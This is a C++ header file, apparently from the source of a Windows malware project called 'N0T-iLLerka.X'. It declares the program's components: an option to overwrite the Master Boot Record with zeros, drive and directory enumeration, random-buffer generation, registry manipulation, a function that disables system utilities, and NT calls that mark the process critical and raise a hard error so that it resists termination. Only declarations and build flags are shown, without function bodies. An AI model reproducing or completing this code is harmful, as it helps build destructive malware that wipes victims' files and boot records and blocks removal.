#pragma once
// TODO: Clean this Mess up

// Warning Message: //
/* #define DISABLE_WARNING */
	// If defined: Shows the user a warning message that he is about to execute Malware.
	//			   ( IT IS NOT RECOMMENDED TO DISABLE THIS FEATURE ! )

// Kill MasterBootRecord: //
/* #define KILL_MBR */
	// If defined: Kills the MBR (MasterBootRecord) by overwriting it (with Zeros)
	//			   (Optional) (I might write my own MBR displaying a Message)


//// Debug Mode: ////
#define DEBUG
	// If defined: Allows you to disables security features, used by the Malware to prevent the user from tampering with it.
	//			   Also allows you to enable certain debugging features.

//// Debug Suboptions: ////
#ifdef DEBUG
	// Show Debug Messages: //
	#define DEBUG_MSG
		// If defined: Shows the user Error/Warning/Information/(Question) MessageBoxes used for debbuging.

	// NT Process Persistency: //
//	#define DISABLE_NT_FUNCTIONS
		// If defined: Disables and prevents the Malware from utilizing the NT Functions used for Process Persistency.

	// Mutex/Semaphore utilization: //
	/* #define DISABLE_SYNCHRONIZATION */
		// If defined: Disables the usage of a Global Mutex/Semaphore Object
		//			   (It is not recommended to disable this feature, but it might be somtimes necessary for debugging purposes)
#endif

// Debug MessageBox Template //
/*
	// TODO: modify this
	#ifdef DEBUG_MSG
		MessageBox(NULL, L"", L"", MB_OK |  MB_ICON | MB_SYSTEMMODAL);
	#endif // DEBUG_MSG
*/

// Header Files //
#include <Windows.h>
#include <bcrypt.h>
#include <string>
#include <Shlobj.h>
#include <Shlwapi.h>
#include <vector>

#ifdef DEBUG_MSG
#include <strsafe.h>
#endif // DEBUG_MSG

// Libraries //
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "shlwapi.lib")

#ifndef DISABLE_NT_FUNCTIONS
#pragma comment(lib, "ntdll.lib")
#endif // !DISABLE_NT_FUNCTIONS

// Define Macros //
#define MALWR_NAME L"N0T-iLLerka.X"

#define MIN_RSLEN 0x8
#define MAX_RSLEN 0x10

#define MAX_BUFFER_SIZE 0x2000000

#define HOST_MUTEX L"Global\\Win32M.N0T-iLLerka.X:Argv./host.Proc(running)"
#define HOST_SEMAPHORE L"Global\\Win32S.N0T-iLLerka.X:Argv./host.Proc(running)"
#define MAX_SMPO 2

#define REGISTRY_KEY L"SOFTWARE\\N0T-iLLerka.X"
#define REGISTRY_SUBKEY L"N0TiLLerka"
#define REGISTRY_VALUE 0xBADC0DE

// Function Macros //
#define M_RNG_R(nMin, nMax) ((nMin) + (fnCryptGenRandomNumber() % (((nMax) - (nMin)) + 1)))

// Arrays //
extern const WCHAR szCharSet[];
extern const size_t cnCharSet;

// FileSystem Functions //
BOOL fnCopyFileW(
	_In_ LPCWSTR lpAdpn,
	_In_ LPCWSTR lpAdfn,
	_In_ WCHAR szMfn[]
);
BOOL fnDriveEnumeratorW(
	_Inout_ std::vector<std::wstring>& vszDrive
);
BOOL fnDirectoryIteratorW(
	_In_ std::wstring szDir,
	_In_ std::wstring szMask,
	_Inout_ std::vector<std::wstring>& vszDir,
	_Inout_ std::vector<std::wstring>& vszFile
);

#ifdef KILL_MBR
BOOL fnOverwriteMBR(VOID);
#endif // KILL_MBR

// RegEdit Functions //
BOOL fnCreateRegistryKeyW(
	_In_ LPCWSTR lpSubKey,
	_In_ LPCWSTR lpValueName,
	_In_ DWORD dwType,
	_In_ DWORD dwValue
);
BOOL fnCheckRegistryKeyW(
	_In_ LPCWSTR lpSubKey,
	_In_ LPCWSTR lpValueName,
	_In_ DWORD dwEType,
	_In_ BYTE bEValue
);
BOOL fnDisableUtilities(VOID);

// Synchronization Functions //
#ifndef DISABLE_SYNCHRONIZATION
BOOL fnCheckMutexW(
	_In_ LPCWSTR lpName
);
HANDLE fnCheckSemaphoreW(
	_In_ LPCWSTR lpName
);
#endif // !DISABLE_SYNCHRONIZATION

// Utilitie Functions //
INT fnCryptGenRandomNumber(VOID);
std::wstring fnCryptGenRandomStringW(
	_In_ INT nLen
);
VOID fnCryptGenRandomBufferW(
	_Inout_ PWCHAR pszRd,
	_In_ ULONG ulFs
);
BOOL fnIsUserAdmin(VOID);
VOID fnErrorHandlerW(
	_In_ LPCWSTR lpText,
	_In_ LPCWSTR lpCaption,
	_In_ LPCWSTR lpFunction,
	_In_ UINT uType,
	_In_ ...
);

// NT Utilitie Functions //
#ifndef DISABLE_NT_FUNCTIONS
BOOL fnNTSetProcessIsCritical(
	_In_ BOOLEAN blIsCritical
);
BOOL fnNTRaiseHardError(VOID);
#endif // !DISABLE_NT_FUNCTIONS